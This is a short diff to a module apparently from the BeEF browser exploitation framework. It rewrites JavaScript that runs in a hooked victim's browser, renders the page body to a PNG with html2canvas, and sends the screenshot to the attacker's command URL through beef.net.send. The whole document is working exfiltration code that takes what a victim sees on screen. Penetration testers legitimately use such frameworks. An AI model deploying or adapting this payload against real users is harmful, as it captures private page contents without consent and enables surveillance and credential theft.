@@ -12,16 +12,11 @@ beef.execute(function() {
 	$j("body").append( script );
 
 	html2canvas(document.body, {
-	  onrendered: function(canvas) {
-
-        var img = canvas.toDataURL("image/png");
-        var output = img.replace(/^data:image\/(png|jpg);base64,/, "");
-
-    	beef.net.send("<%= @command_url %>", <%= @command_id %>, output);
-    	//beef.net.send("<%= @command_url %>", <%= @command_id %>, "image=All done");
-
-	  }
-	});				
-
+		onrendered: function(canvas) {
+			var img = canvas.toDataURL("image/png");
+			beef.net.send("<%= @command_url %>", <%= @command_id %>, "image="+img);
+			//beef.net.send("<%= @command_url %>", <%= @command_id %>, "image=All done");
+		}
+	});
 
 });
